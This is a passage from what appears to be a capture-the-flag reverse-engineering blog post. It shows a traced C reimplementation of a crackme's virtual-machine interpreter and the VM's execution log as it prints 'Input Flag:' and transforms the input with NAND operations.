(<span class="type">char</span>)v1[*(<span class="type">int</span> *)&amp;v1[v9]];</span><br><span class="line">    <span class="comment">//      printf(&quot;v9 = v2\n&quot;);</span></span><br><span class="line">    <span class="comment">//      printf(&quot;v2 += 4\n&quot;);</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v10 = v1[%d] (%d)\n&quot;</span>,*(<span class="type">int</span> *)&amp;v1[v9],(<span class="type">char</span>)v1[*(<span class="type">int</span> *)&amp;v1[v9]]);</span><br><span class="line">                <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                v11 = v2;      </span><br><span class="line">                v12 = dword_6010A4;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v8 = *(<span class="type">int</span> *)&amp;v1[v11];</span><br><span class="line">    <span class="comment">//      printf(&quot;v11 = v2\n&quot;);</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v12 = dword_6010A4\n&quot;</span>);</span><br><span class="line">    <span class="comment">//      printf(&quot;v2 +=4\n&quot;);</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v8 = v1[%lld] (%d)\n&quot;</span>,v11,*(<span class="type">int</span> *)&amp;v1[v11]);</span><br><span class="line">                <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                v13 = dword_6010A4;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v13 = dwod_6010A4 (%d)\n&quot;</span>,dword_6010A4);</span><br><span class="line">                <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                v14 = ~(dword_6010A4 &amp; c);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;dword_6010A4 = %d ; c = %d\n&quot;</span>,dword_6010A4,c);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v14 = dword_6010A4 nand c\n&quot;</span>);</span><br><span class="line">                <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;input:\n&quot;</span>);</span><br><span class="line">                v14 = <span class="built_in">getchar</span>();</span><br><span class="line">                <span class="keyword">goto</span> LABEL_12;  </span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xB</span>:                                            <span class="comment">//the output of judgement</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;output:\n&quot;</span>);</span><br><span class="line">                <span class="built_in">putchar</span>(c);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">                v15 = &amp;v1[*(<span class="type">int</span> *)&amp;v1[v2]];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v15 = &amp;v1[%d] (%d)\n&quot;</span>,*(<span class="type">int</span> *)&amp;v1[v2],v1[*(<span class="type">int</span> *)&amp;v1[v2]]);</span><br><span class="line">                <span class="keyword">if</span> ( *v15 )&#123;</span><br><span class="line">                    v2 = *(_DWORD *)&amp;v1[v2 + <span class="number">4</span>];</span><br><span class="line">                    --*v15;</span><br><span class="line">    <span class="comment">//        printf(&quot;v2 = v1[%d]\n&quot;,v2+4);</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;--*v15\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//        printf(&quot;v2 += 8\n&quot;);</span></span><br><span class="line">                    v2 += <span class="number">8</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xD</span>:</span><br><span class="line">                ++c;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;c++\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xE</span>:</span><br><span class="line">                ++dword_6010A4;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;dword_6010A4++\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xF</span>:</span><br><span class="line">                v14 = dword_6010A4;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v14 = dword_6010A4\n&quot;</span>);</span><br><span class="line">                <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">                v10 = c;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v10 = c(%d)\n&quot;</span>,c);</span><br><span class="line">                <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">                v16 = v2;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v13 = *(_DWORD *)&amp;v1[v16];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v13 = v1[%lld] (%d)\n&quot;</span>,v16,c);</span><br><span class="line">    <span class="comment">//      printf(&quot;v16 = v2 (%d)\n&quot;,v2);</span></span><br><span class="line">    <span class="comment">//      printf(&quot;v2 += 2\n&quot;);</span></span><br><span class="line">                LABEL_23:</span><br><span class="line">                    c += v13;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;c += v13\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x12</span>:</span><br><span class="line">                v6 = dword_6010A4;</span><br><span class="line">    <span class="comment">//      printf(&quot;v6 = dword_6010A4\n&quot;);</span></span><br><span class="line">                <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">                v6 = c;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v6 = c\n&quot;</span>);</span><br><span class="line">                LABEL_27:</span><br><span class="line">                    v14 = (<span class="type">char</span>)v1[v6];</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;v14 = v1[%d] (%c)\n&quot;</span>,v6,v14);</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">                v17 = v2;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v14 = *(_DWORD *)&amp;v1[v17];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v14 =v1[%lld] (%d)\n&quot;</span>,v17,v14);</span><br><span class="line">                <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x15</span>:</span><br><span class="line">                v18 = v2;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v10 = *(_DWORD *)&amp;v1[v18];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v10 =v1[%lld] (%d)\n&quot;</span>,v18,v10);</span><br><span class="line">                LABEL_21:</span><br><span class="line">                    dword_6010A4 = v10;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;dword_6010A4 = v10\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x16</span>:</span><br><span class="line">                v8 = dword_6010A4;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v8 = dword_6010A4\n&quot;</span>);</span><br><span class="line">                LABEL_31:</span><br><span class="line">                    v12 = c;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;v12 = c\n&quot;</span>);</span><br><span class="line">                    LABEL_9:</span><br><span class="line">                        v1[v8] = v12;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;v1[%lld] = v12 (%d)\n&quot;</span>,v8,v12);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x17</span>:</span><br><span class="line">                v14 = c - dword_6010A4;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;__dword_6010A4 = %d     c = %d\n&quot;</span>,dword_6010A4,c);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v14 = c - dword_6010A4\n&quot;</span>);</span><br><span class="line">                LABEL_12:</span><br><span class="line">                    c = v14;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;c = v14\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x18</span>:</span><br><span class="line">                <span class="keyword">if</span> ( c )&#123;</span><br><span class="line">                    LABEL_35:</span><br><span class="line">    <span class="comment">//          printf(&quot;v2 = v1[%d]\n&quot;,v2);</span></span><br><span class="line">                        v2 = *(_DWORD *)&amp;v1[v2];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    v2 = v0 + <span class="number">5</span>;</span><br><span class="line">    <span class="comment">//        printf(&quot;v2 = v0 + 5\n&quot;);</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v2 &gt;= length_of_file )&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;length end\nreturn;\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">                </span><br><span class="line">            v0 = v2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="outputs"><a href="#outputs" class="headerlink" title="outputs:"></a>outputs:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v10 =v1[49] (256)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[257] (I)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">Iv15 = &amp;v1[256] (10)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[258] (n)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">nv15 = &amp;v1[256] (9)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[259] (p)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">pv15 = &amp;v1[256] (8)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[260] (u)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">uv15 = &amp;v1[256] (7)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[261] (t)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">tv15 = &amp;v1[256] (6)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[262] ( )</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line"> v15 = &amp;v1[256] (5)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[263] (F)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">Fv15 = &amp;v1[256] (4)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[264] (l)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">lv15 = &amp;v1[256] (3)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[265] (a)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">av15 = &amp;v1[256] (2)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[266] (g)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">gv15 = &amp;v1[256] (1)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[267] (:)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">:v15 = &amp;v1[256] (0)</span><br><span class="line">v10 =v1[67] (272)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">00000000000000000000000000000000000000</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[273] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (31)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[274] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (30)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[275] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (29)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[276] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (28)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[277] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (27)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[278] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (26)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[279] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (25)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[280] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (24)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[281] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (23)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[282] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (22)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[283] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (21)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[284] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (20)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[285] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (19)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[286] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (18)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[287] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (17)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[288] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (16)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[289] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (15)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[290] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (14)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[291] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (13)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[292] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (12)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[293] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (11)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[294] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (10)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[295] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (9)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[296] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (8)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[297] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (7)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[298] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (6)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[299] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (5)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[300] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (4)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[301] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (3)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[302] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (2)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[303] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (1)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[304] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (0)</span><br><span class="line">v14 = v1[320] ( )</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(32)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (32)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[273] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 32 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] ( )</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 32</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-1)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -1</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (16)</span><br><span class="line">v14 = v1[320] ( )</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (32)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(273)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[273] = v12 (16)</span><br><span class="line">v10 = v1[320] (32)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (33)</span><br><span class="line">v15 = &amp;v1[325] (31)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (!)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (33)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[274] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (!)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 33</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-2)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -2</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (17)</span><br><span class="line">v14 = v1[320] (!)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (33)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(274)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[274] = v12 (17)</span><br><span class="line">v10 = v1[320] (33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (34)</span><br><span class="line">v15 = &amp;v1[325] (30)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (&quot;)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(34)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (34)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[275] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 34 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (&quot;)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 34</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-3)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -3</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (18)</span><br><span class="line">v14 = v1[320] (&quot;)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (34)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(275)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[275] = v12 (18)</span><br><span class="line">v10 = v1[320] (34)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (35)</span><br><span class="line">v15 = &amp;v1[325] (29)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (#)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(35)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (35)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = 